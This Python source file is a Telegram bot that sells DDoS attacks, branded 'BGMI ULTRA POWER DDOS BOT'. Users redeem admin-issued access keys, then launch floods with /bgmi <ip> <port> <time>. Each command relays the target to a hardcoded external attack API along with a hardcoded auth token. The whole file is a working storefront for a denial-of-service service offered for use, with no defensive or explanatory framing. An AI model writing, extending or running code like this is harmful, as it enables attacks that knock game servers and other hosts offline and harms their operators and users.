import telebot
import json
import requests
import datetime
import os
import time
import psutil # - Asali System Load ke liye
import socket
import threading

# - Load Config (Admin ID aur Token)
if os.path.exists('config.json'):
    with open('config.json') as f:
        config = json.load(f)
else:
    print("Error: config.json file nahi mili!")
    exit()

bot = telebot.TeleBot(config['token'])
# Agar API isi VPS par hai toh '127.0.0.1' use karein, varna VPS ka IP dalein
API_URL = "http://34.126.208.96:8080/hit" 
AUTH_TOKEN = "DRX_POWER_ULTRA_V4"

# Database files
KEYS_FILE = "keys.json"
USERS_FILE = "users.json"

def load_data(file):
    if os.path.exists(file):
        with open(file, 'r') as f: return json.load(f)
    return {}

def save_data(file, data):
    with open(file, 'w') as f: json.dump(data, f, indent=4)

# - Commands Logic
@bot.message_handler(commands=['start'])
def welcome(m):
    bot.reply_to(m, "🔥 BGMI ULTRA POWER DDOS BOT!\n\n🔥 Use /help to see command list.\n☃️ Powered By Bgmi Ultra DDoS.\n✅ Status: 🌩️ Server Running...")

@bot.message_handler(commands=['help'])
def help_cmd(m):
    help_text = """
🚀 Available Commands:
/bgmi <ip> <port> <time> - Start Attack
/redeem <key> - Activate Plan
/myinfo - Check your Plan
/status - Current Attack Status
    """
    bot.reply_to(m, help_text)

@bot.message_handler(commands=['genkey'])
def genkey(m):
    if str(m.from_user.id) != str(config['admin']):
        return bot.reply_to(m, "❌ Admin only command.")
    
    args = m.text.split()
    if len(args) < 2: return bot.reply_to(m, "Usage: /genkey 1h, 1d, 1w")
    
    duration = args[1]
    key = "Bgmi-Ultra-" + os.urandom(3).hex().upper()
    
    keys = load_data(KEYS_FILE)
    keys[key] = duration
    save_data(KEYS_FILE, keys)
    
    bot.reply_to(m, f"✅ Access code generated!\n\n🔑 Access code: {key}\n⏳ Access duration: {duration}")

@bot.message_handler(commands=['redeem'])
def redeem(m):
    args = m.text.split()
    if len(args) < 2: return bot.reply_to(m, "⚠️ Usage: /redeem BGMI-ULTRA-XXXX")
    
    user_key = args[1]
    keys = load_data(KEYS_FILE)
    
    if user_key in keys:
        duration = keys[user_key]
        users = load_data(USERS_FILE)
        
        users[str(m.from_user.id)] = {"plan": duration, "active": True}
        save_data(USERS_FILE, users)
        
        del keys[user_key]
        save_data(KEYS_FILE, keys)
        bot.reply_to(m, f"✅ Access code activate successfully!\n🔥 Access Plan: {duration} active.\n☃️ Bot access unlocked for using.\n\n⚠️ You can now use the bot.")
    else:
        bot.reply_to(m, "❌ Invalid or Expired Access Code.")

@bot.message_handler(commands=['bgmi'])
def attack(m):
    # Sahi function name use kiya gaya hai
    users = load_data(USERS_FILE) 
    user_id = str(m.from_user.id)
    
    if user_id not in users or not users[user_id].get('active'):
        return bot.reply_to(m, "❌ Access Denied!\n\n ⚠️ No active plan found on this bot.\n🌲 Please use /redeem <access code> first.")

    args = m.text.split()
    if len(args) != 4: 
        return bot.reply_to(m, "⚠️ Usage: /attack <ip> <port> <time>")
    
    ip, port, attack_time = args[1], args[2], args[3]
    
    try:
        response = requests.get(f"{API_URL}?token={AUTH_TOKEN}&ip={ip}&port={port}&time={attack_time}", timeout=10)
        
        if response.status_code == 200:
            bot.reply_to(m, f"⚡ Attack Launched! ⚡\n\n🎯 Target: {ip}:{port}\n⏳ Time: {attack_time} seconds\n💎 Power: BGMI ULTRA\n\n📶 Status: API CONNECTED ✅")
            
            def send_finish():
                bot.send_message(m.chat.id, f"✅ ATTACK FINISHED\n🎯 Target: {ip}:{port}\nStatus: Match Server Response Timed Out")
            
            threading.Timer(int(attack_time), send_finish).start()
        else:
            bot.reply_to(m, "❌ Api Error!\n• Server responded but with an error.")
            
    except Exception as e:
        bot.reply_to(m, "❌ Vps Offline!\n• Could not connect to API. python3 api.py not start.")

@bot.message_handler(commands=['myinfo'])
def myinfo(m):
    users = load_data(USERS_FILE)
    user_id = str(m.from_user.id)
    if user_id in users:
        bot.reply_to(m, f"👤 User Information! 👤\n\n🌲 Access Plan: {users[user_id]['plan']}\n☃️ Status: Active ✅")
    else:
        bot.reply_to(m, "❌ No active plan found.")

@bot.message_handler(commands=['status'])
def status(m):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    try:
        # Localhost check ke liye 127.0.0.1 sahi hai
        s.connect(('127.0.0.1', 8080))
        api_status = "Online 🟢"
        s.close()
    except:
        api_status = "Offline 🔴"

    cpu_usage = psutil.cpu_percent(interval=1)
    ram_usage = psutil.virtual_memory().percent
    load_icon = "🟢" if cpu_usage < 50 else "🟡" if cpu_usage < 80 else "🔴"
    
    status_text = (
        "📊 BOT POWER LIVE STATUS\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"🤖 Bot Status: Active ✅\n"
        f"🔌 API Connection: {api_status}\n"
        f"🖥️ CPU Load: {cpu_usage}% {load_icon}\n"
        f"💾 RAM Usage: {ram_usage}% 🟢\n"
        f"🚀 VPS Power: 32GB OPTIMIZED\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )
    bot.reply_to(m, status_text, parse_mode="Markdown")

bot.polling(none_stop=True)
